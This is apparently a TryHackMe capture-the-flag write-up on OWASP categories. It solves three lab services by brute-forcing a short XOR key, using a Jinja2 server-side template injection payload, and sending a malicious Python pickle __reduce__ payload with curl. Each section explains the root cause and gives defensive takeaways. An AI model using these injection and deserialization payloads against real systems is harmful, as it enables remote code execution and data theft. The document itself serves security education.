# TryHackMe: OWASP Top 10 2025 — Application Behaviour & User Input — Writeup

**Room:** OWASP Top 10 2025 — Application Behaviour & User Input (Module: OWASP Top 10 2025)
**Categories covered:**
- A04: Cryptographic Failures
- A05: Injection
- A08: Software or Data Integrity Failures

## Overview

This room is the companion to the architecture/design-focused OWASP room, this time centered on how applications handle **user input and untrusted data** at runtime. Three independently running vulnerable services demonstrate one flaw each, with the room generously providing "Toggle solution" hints on two of the three challenges — worth noting, since it kept the focus on understanding *why* each exploit works rather than pure endpoint discovery.

| Port | Category | Vulnerability Theme |
|---|---|---|
| 8001 | A04 — Cryptographic Failures | Homegrown XOR cipher with a short, partially-hinted key |
| 8000 | A05 — Injection | Server-Side Template Injection (SSTI) via unsandboxed Jinja2 |
| 8002 | A08 — Software or Data Integrity Failures | Insecure deserialization of untrusted Python pickle data |

## A04 — Cryptographic Failures (Port 8001)

A "note sharing" app displayed three base64-encoded ciphertexts, all encrypted with the **same 4-character XOR key**. The app disclosed the first three characters of the key as a hint (`KEY_`) and stated the key contains both letters and numbers — narrowing the final character to a single digit, i.e. only 10 possibilities.

Rather than brute-forcing through the web form, the keyspace was tested locally against all three ciphertexts simultaneously:

```python
import base64

notes = [
    'BiA8RSIrPhE4JjFULzA1VC9lP145ZS1eJiorQyQyeVA/ZWoRGwh3EQgqN1cuNzxfKCB5QyQqNBEJaw==',
    'GyQqQjwqK1VrNzxCLjF5XSIrMgtrLS1FOzZjHmQsN0UuNzdQJ2stWSZqK1Q4IC0OPyoyVCV4OFModGsC',
    'GAAaYw4RYxEfDRRKHAAYehQGC2gbERZuDQkYdjZldBEPKnlfJDF5QiMkK1RrMTFYOGUuWD8teUQlJCxFIyorWDEgPRE7ICtCJCs3VCdr',
]

for digit in '0123456789':
    key = ('KEY' + digit).encode()
    for n in notes:
        data = base64.b64decode(n)
        pt = bytes([b ^ key[i % len(key)] for i, b in enumerate(data)])
        print(pt)
```

Key `KEY1` produced fully readable plaintext across all three notes, one of which was the flag:

```
Meeting scheduled for tomorrow at 3 PM. Conference room B.
Password reset link: https://internal.thm/reset?token=abc123
SECRET: THM{WEAK_CRYPTO_FLAG} - Do not share this with unauthorized personnel.
```

**Flag:** `THM{WEAK_CRYPTO_FLAG}`

**Root cause:** XOR with a short, repeating key is not encryption in any meaningful sense against a known- or partially-known-plaintext attack — every byte position `i` is protected by only `key[i % len(key)]`, so once any portion of the key or plaintext is known (or guessable, as with English-language notes), the rest falls quickly. The room's own hint text underscores the point: this is what "rolling your own crypto" gets you.

## A05 — Injection (Port 8000)

The app was an intentionally transparent **SSTI playground**: user input was rendered directly through Flask's `render_template_string()`, with the page itself explaining the vulnerability, suggesting exploration payloads (`{{ 7*7 }}`, `{{ config.items() }}`), and — via a "Toggle solution" panel — providing the exact escape chain needed to reach the filesystem.

Since Jinja2 templates aren't sandboxed by default, arbitrary attribute traversal from any object in the render context can reach Python internals. Here, `request.application` led to Flask's WSGI app object, whose `__globals__` exposed the module's global namespace, including `__builtins__`:

```bash
curl -s -X POST http://<target>:8000/ \
  --data-urlencode "payload={{ request.application.__globals__.__builtins__.open('flag.txt').read() }}"
```

The rendered output panel returned:
```
THM{SSTI_FLAG_OBTAINED}
```

**Flag:** `THM{SSTI_FLAG_OBTAINED}`

**Root cause:** treating user-controlled strings as template *source* (rather than template *data*) hands an attacker a path from "just text" to full Python object introspection and, from there, arbitrary code execution — `open()` here, but `os.system()`/`subprocess` would work identically through the same `__builtins__` reference. The fix is architectural: never pass unsanitized user input into `render_template_string()`; use fixed templates with input only as variables.

## A08 — Software or Data Integrity Failures (Port 8002)

The app accepted base64-encoded **Python pickle** data via a POST form and deserialized it with no signature verification, type whitelisting, or restricted unpickler — again, the page explained the exact mechanism and provided a worked example in its "Toggle solution" panel.

Python's pickle protocol lets any object define `__reduce__()`, which specifies a callable and arguments to be invoked automatically during unpickling — this is intentional pickle behavior, not a bug, which is exactly what makes deserializing untrusted pickle data equivalent to remote code execution:

```python
import pickle
import base64

class Malicious:
    def __reduce__(self):
        return (eval, ("open('flag.txt').read()",))

payload = pickle.dumps(Malicious())
encoded = base64.b64encode(payload).decode()
print(encoded)
```

The generated payload was submitted directly to the form:

```bash
PAYLOAD=$(python3 -c "
import pickle, base64
class Malicious:
    def __reduce__(self):
        return (eval, (\"open('flag.txt').read()\",))
print(base64.b64encode(pickle.dumps(Malicious())).decode())
")

curl -s -X POST http://<target>:8002/ --data-urlencode "pickle_data=$PAYLOAD"
```

The app's "Deserialized Output" panel returned:
```
THM{INSECURE_DESERIALIZATION}
```

**Flag:** `THM{INSECURE_DESERIALIZATION}`

**Root cause:** the vulnerability isn't in any single line of "buggy" code — it's a trust-boundary failure. The application assumed that data arriving in pickle format could be safely deserialized because pickle is normally used for *internal* application state, not *external* untrusted input. Once that assumption breaks (accepting pickle data directly from a user-facing form), the attacker controls what code executes during deserialization itself, before the application even gets to inspect the resulting object.

## Summary

| Category | Flag |
|---|---|
| A04 — Cryptographic Failures | `THM{WEAK_CRYPTO_FLAG}` |
| A05 — Injection (SSTI) | `THM{SSTI_FLAG_OBTAINED}` |
| A08 — Software or Data Integrity Failures | `THM{INSECURE_DESERIALIZATION}` |

## Key Takeaways

- **Short or homegrown ciphers offer no real security**, regardless of key secrecy — a 4-character repeating XOR key over natural-language plaintext is breakable in milliseconds with a handful of guesses, let alone a full keyspace search.
- **Never render user input as a template.** Any templating engine that evaluates expressions (Jinja2, Twig, Freemarker, etc.) will happily walk from "just text" to language internals and code execution if the input isn't strictly separated from the template source itself.
- **Never deserialize untrusted data with formats that support arbitrary code execution** (Python `pickle`, Java native serialization, PHP `unserialize` with magic methods, etc.). If data must cross a trust boundary, use a safe, data-only format (JSON, or YAML with `safe_load`) and validate/whitelist the resulting structure.
- All three flaws share the same underlying pattern from the room's introduction: **the application trusted something it shouldn't have** — a short key's secrecy, a template string's safety, or a serialized blob's origin — without independently verifying it.

## Tools Used

- `curl` — form submission and payload delivery
- `python3` — XOR brute-force, pickle payload crafting, base64 encoding

---
*Writeup based on hands-on completion of the TryHackMe OWASP Top 10 2025 Application Behaviour & User Input room.*
